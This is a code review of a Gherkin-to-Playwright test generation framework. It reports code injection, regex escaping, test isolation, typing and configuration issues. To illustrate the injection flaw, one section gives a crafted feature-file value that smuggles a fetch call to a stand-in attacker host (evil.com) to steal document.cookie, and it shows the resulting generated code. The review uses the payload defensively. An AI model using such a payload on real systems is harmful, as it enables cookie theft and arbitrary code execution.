# Code Review: E2E Testing Framework

**Date**: 2026-03-08
**Reviewer**: code-reviewer
**Branch**: project/upmount

---

## Scope

- **Files reviewed**: 15 (6 step modules, 3 generator modules, 1 config, 4 generated specs, 1 Playwright config)
- **LOC (code)**: ~851 (excluding QC-GUIDE.md)
- **LOC (docs)**: ~223 (QC-GUIDE.md) + ~49 (generate-e2e.md) + ~41 (run-e2e.md)
- **Focus**: Full framework review — core, config, generated output, docs
- **Type check**: PASSED (`npx tsc --noEmit --project e2e/tsconfig.json` — zero errors)

---

## Overall Assessment

Well-designed framework with a clean Gherkin-to-Playwright code generation architecture. The step catalog pattern is elegant: deterministic pattern matching eliminates AI cost for known steps while gracefully degrading to `// TODO: [AI]` markers for unknown ones. File sizes are well within the 200-line limit. Types are properly defined. The main concerns are **injection vulnerabilities in generated code** and **a regex escaping bug in the catalog**.

**Verdict: GOOD with 2 critical fixes needed**

---

## Critical Issues

### C1. Code Injection via Unsanitized User Input in Generated Code

**Severity**: CRITICAL (Security)
**Files**: `e2e/steps/catalog.ts` (lines 116-143), `navigation.steps.ts`, `form.steps.ts`, `assertion.steps.ts`, `api.steps.ts`, `code-emitter.ts`

**Problem**: Step `generateCode` functions interpolate captured Gherkin arguments directly into generated Playwright code using template literals. A malicious or accidental `.feature` file with crafted values can inject arbitrary code into the generated `.spec.ts`.

**Example attack vector** in a `.feature` file:
```gherkin
When I navigate to "'); await page.evaluate(() => fetch('https://evil.com/steal?cookies='+document.cookie)); //"
```

This generates:
```ts
await page.goto(''); await page.evaluate(() => fetch('https://evil.com/steal?cookies='+document.cookie)); //');
```

**Affected step files** — ALL `generateCode` functions use unescaped string interpolation:
- `navigation.steps.ts`: `page.goto('${url}')` — injects into navigation
- `form.steps.ts`: `.fill('${value}')` — injects via form values
- `assertion.steps.ts`: `.getByText('${text}')` — injects via assertion text
- `api.steps.ts`: `apiClient.get('${endpoint}')` — injects into API URLs
- `api.steps.ts` line 46: `ctx.lastApiResponse.data.${field}` — property traversal injection, could execute `toString()` or similar
- `catalog.ts` inline steps (lines 116-143): same pattern
- `code-emitter.ts`: `escapeQuotes()` only escapes single quotes, not backticks, backslashes, or newlines

**Impact**: Generated `.spec.ts` files are valid TypeScript that Playwright executes with full browser context. Injected code runs with the test runner's permissions.

**Recommendation**: Create a `sanitizeForCodegen(str: string): string` utility that escapes `\`, `'`, `` ` ``, `$`, and newlines. Apply to ALL interpolated values in `generateCode` functions. Also consider the `code-emitter.ts` `escapeQuotes` function — rename it to `sanitize` and expand it.

For `api.steps.ts` line 46 (`data.${field}`), use bracket notation with string key instead:
```ts
// Before (injection risk):
`expect(ctx.lastApiResponse.data.${field}).toBe('${value}');`
// After (safe):
`expect(ctx.lastApiResponse.data['${sanitize(field)}']).toBe('${sanitize(value)}');`
```

### C2. Regex Escaping Bug in `patternToRegex` — Breaks on Certain Patterns

**Severity**: CRITICAL (Correctness)
**File**: `e2e/steps/catalog.ts`, lines 34-40

**Problem**: The function replaces `"{param}"` and `{param}` with regex capture groups FIRST, then attempts to escape remaining special regex characters. However, the "don't escape" check on line 36 is flawed — it passes through ALL regex metacharacters (`(`, `)`, `[`, `]`, `\`, `|`, `^`, `$`, `+`, `?`, `*`) unescaped, meaning ANY of these characters in a pattern string will be treated as regex syntax rather than literal text.

**Example**: A pattern like `I see element (sidebar)` would NOT match the literal string `I see element (sidebar)` because `(` and `)` become regex grouping, not literal parens.

**Root cause**: The escape logic runs AFTER capture group insertion. It should only skip escaping the specific capture groups that were inserted, not all instances of metacharacters. The current approach effectively disables ALL regex escaping.

**Recommendation**: Escape the pattern FIRST (fully), then replace `"{param}"` and `{param}` with capture groups. Or use a split-and-rejoin approach that only preserves the known capture group substrings.

---

## High Priority

### H1. `ctx` Shared Across Tests — Test Isolation Violation

**Severity**: HIGH (Correctness)
**File**: `e2e/generator/code-emitter.ts`, line 49

```ts
const ctx = { variables: new Map<string, any>(), lastApiResponse: null as any };
```

This `ctx` object is declared at the top of the `test.describe` block (module scope relative to the describe). Playwright runs tests within a describe block potentially in parallel (`fullyParallel: true` in config). Shared mutable state between tests causes race conditions.

**Recommendation**: Move `ctx` initialization inside each `test()` block, or use Playwright fixtures to create per-test context.

### H2. `StepDef` Interface Duplicated Across 4 Files

**Severity**: HIGH (Maintainability)
**Files**: `navigation.steps.ts:6-9`, `form.steps.ts:6-9`, `assertion.steps.ts:6-9`, `api.steps.ts:6-9`

Each step file defines its own identical `StepDef` interface:
```ts
interface StepDef {
  pattern: string;
  generateCode: (args: string[]) => string;
}
```

This violates DRY. If the interface changes (e.g., adding an optional `description` field), all 4 files need updating.

**Recommendation**: Export `StepDef` from `types.ts` and import it in all step files.

### H3. Playwright Config Browser Mismatch

**Severity**: HIGH (Correctness)
**File**: `e2e/playwright.config.ts`, lines 33-37

```ts
projects: [
  {
    name: e2eConfig.browser,     // "chromium"
    use: { ...devices['Desktop Chrome'] },  // hardcoded
  },
],
```

The project name comes from config (`e2eConfig.browser`) but the device is hardcoded to `Desktop Chrome`. If someone changes `e2e.config.json` browser to `"firefox"` or `"webkit"`, the project name changes but the actual device profile remains Chrome. This is silently incorrect.

**Recommendation**: Map `e2eConfig.browser` to the correct `devices` entry, or remove the config-driven name and hardcode `chromium` to avoid confusion.

### H4. `any` Type Usage in Critical Paths

**Severity**: HIGH (Type Safety)
**Files**: `code-emitter.ts:49`, generated specs

```ts
const ctx = { variables: new Map<string, any>(), lastApiResponse: null as any };
```

`any` on `lastApiResponse` and variable values means no type checking on API response access. `ctx.lastApiResponse.data.nonExistentField` compiles without error.

**Recommendation**: Define an `ApiResponse` interface (even a loose one with `status: number; data: Record<string, unknown>`) and use it instead of `any`.

---

## Medium Priority

### M1. `expandScenarioOutline` Does Not Escape Regex Special Chars in Substitution Keys

**File**: `e2e/generator/feature-parser.ts`, line 136

```ts
name = name.replace(new RegExp(`<${key}>`, 'g'), val);
```

If a header name contains regex metacharacters (e.g., `$amount` or `status(code)`), this creates an invalid regex or matches unintended text. Unlikely with typical Gherkin headers but a latent bug.

**Recommendation**: Use `key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')` before constructing the RegExp.

### M2. No Feature File Validation Before Generation

**File**: `e2e/generator/generator.ts`

If a `.feature` file has no scenarios (only a Feature line), `parseFeature` returns an empty `scenarios` array. `emitSpecFile` produces a valid but empty test file (just imports + empty describe block). No warning is emitted.

Similarly, if a scenario has zero steps, it generates an empty `test()` block. Playwright will pass this as a "passing test" — potentially masking missing test coverage.

**Recommendation**: Warn when `feature.scenarios.length === 0` or when a scenario has zero steps. Consider emitting `test.skip` or `test.todo` for empty scenarios.

### M3. Generated Imports May Reference Non-Existent Helpers

**File**: `e2e/generator/code-emitter.ts`, lines 43-45

```ts
if (hasApiSteps) {
  lines.push("import { apiClient } from '../../generated/helpers/api-client.js';");
  lines.push("import { authHelper } from '../../generated/helpers/auth-helper.js';");
}
```

Import paths use `.js` extension (ESM convention) but the actual files are `.ts`. Playwright with its TypeScript support resolves this, but if the helpers are moved or renamed, the generated code breaks silently at runtime, not compile time. The `e2e/tsconfig.json` path aliases (`@helpers/*`) are defined but NOT used in generated code.

**Recommendation**: Use the tsconfig path aliases (e.g., `@helpers/api-client`) or verify the resolution strategy is documented.

### M4. CLI Entry Detection Is Fragile

**File**: `e2e/generator/generator.ts`, line 113

```ts
const isCLI = process.argv[1]?.includes('generator');
```

This matches ANY path containing `generator` — including unrelated scripts like `report-generator.ts` or `code-generator.ts`. It could trigger unintended CLI behavior when imported as a module.

**Recommendation**: Use `import.meta.url` comparison or `fileURLToPath` to check if the module is the entry point, matching the pattern already used in `playwright.config.ts`.

### M5. `escapeQuotes` Only Handles Single Quotes

**File**: `e2e/generator/code-emitter.ts`, line 151

```ts
function escapeQuotes(str: string): string {
  return str.replace(/'/g, "\\'");
}
```

This function is used for `test.describe('...')` and `test('...')` labels. If a scenario name contains a backslash (`\`) or template literal syntax (`${}`), the generated code may have syntax errors or injection issues. The function name implies broader quote handling than it provides.

**Recommendation**: Also escape `\` (before `'`), and consider newlines. Rename to `escapeForSingleQuoteString`.

---

## Low Priority

### L1. `e2eConfig.headless` Not Used in Playwright Config

The `e2e.config.json` defines `"headless": true` but `playwright.config.ts` never reads it. Playwright defaults to headless mode in CI, but the config key is misleading — it suggests it controls headless behavior when it does not.

### L2. Data Table Handling Limited to `field/value` Headers

`code-emitter.ts` lines 109-119 only handle data tables with exact `field` and `value` column names. Any other table structure is silently ignored. This is not documented in the QC Guide.

### L3. `printCatalog()` in catalog.ts Is Never Called

Utility function exists but no CLI command or documentation references it. Dead code unless there's an undiscovered consumer.

### L4. Generated Spec Timestamps Make Diffs Noisy

Line 34 of `code-emitter.ts`: `Generated at: ${new Date().toISOString()}`. Every regeneration changes this line, making git diffs noisy even when the actual test logic hasn't changed.

---

## Edge Cases Found by Scout

1. **Feature file with ONLY Background, no Scenarios** — generates empty describe block with just `beforeEach`. Playwright passes with 0 tests — invisible to test counts.
2. **Scenario Outline with zero Examples rows** — `expandScenarioOutline` returns empty array. Feature appears to have no tests. No warning.
3. **Step text containing double quotes** — `"{param}"` regex captures `([^"]*)` so nested quotes in values would break the match: `I fill "email" with "it's a "test""` would fail to match.
4. **`authHelper.setAuthToken` in Background** — runs before each test in `beforeEach`, but the token is set on a shared `authHelper` instance. If tests run in parallel, tokens could be overwritten.
5. **API steps in Background + `{ page }` fixture detection** — `vault-management.feature` has API-only Background (`API: user "owner" is authenticated`) but the generated `beforeEach` requests `{ page }` fixture because `isApiOnly` checks only the feature-level tag, not the background steps.

---

## Positive Observations

1. **Clean architecture**: Step catalog pattern (registry + pattern matching + code generation) is well-separated and extensible
2. **Proper Gherkin parsing**: Uses official `@cucumber/gherkin` library instead of hand-rolled parser; handles Background, Scenario Outline, Examples, data tables
3. **File sizes under 200 lines**: Every code file respects the modularization limit
4. **TypeScript throughout**: Proper interfaces for `StepTemplate`, `StepMatch`, `UnmatchedStep`, `ParsedFeature`, `EmitResult`, `GeneratorResult`
5. **Graceful degradation**: Unmatched steps produce `// TODO: [AI]` markers instead of failing — allows incremental catalog development
6. **QC-GUIDE.md**: Excellent documentation — comprehensive, well-structured, includes all step patterns with examples
7. **Zero-cost vs AI-cost separation**: Clear distinction between catalog-matched (deterministic) and unmatched (AI-interpreted) steps with match rate reporting
8. **Type check passes**: Zero TypeScript errors across the entire framework

---

## Recommended Actions (Priority Order)

1. **[CRITICAL]** Implement `sanitizeForCodegen()` utility and apply to ALL `generateCode` string interpolations across all step files and inline steps in catalog.ts
2. **[CRITICAL]** Fix `patternToRegex` regex escaping — escape the pattern first, then insert capture groups
3. **[HIGH]** Move `ctx` initialization inside each `test()` block to prevent parallel test interference
4. **[HIGH]** Fix Playwright config browser/device mapping to use `e2eConfig.browser` dynamically
5. **[HIGH]** Extract shared `StepDef` interface to `types.ts`
6. **[MEDIUM]** Escape regex metacharacters in `expandScenarioOutline` header substitution
7. **[MEDIUM]** Add warnings for empty features/scenarios during generation
8. **[MEDIUM]** Fix CLI entry detection to use `import.meta.url`
9. **[LOW]** Remove or use `headless` config key, document data table limitations

---

## Metrics

| Metric | Value |
|--------|-------|
| Type Coverage | ~95% (2 `any` usages in ctx) |
| Test Coverage | N/A (no unit tests for the framework itself) |
| Linting Issues | 0 (TypeScript strict mode passes) |
| Security Issues | 1 critical (code injection) |
| Files Under 200 LOC | 10/10 (all pass) |
| Step Catalog Size | 28 patterns (6 nav + 6 form + 9 assertion + 7 api + 6 action/data inline) |

---

## Unresolved Questions

1. Are `.feature` files treated as trusted input (written only by QC team), or could external/user-supplied features be processed? This determines urgency of C1.
2. Is there a plan to add unit tests for the framework itself (catalog matching, feature parsing, code emission)?
3. The `e2e/pages/` directory is empty (`.gitkeep` only). Is Page Object Model planned, and will generated code eventually use POM?
4. Import paths in generated code use `../../generated/helpers/api-client.js` — will these need updating if the output directory structure changes?
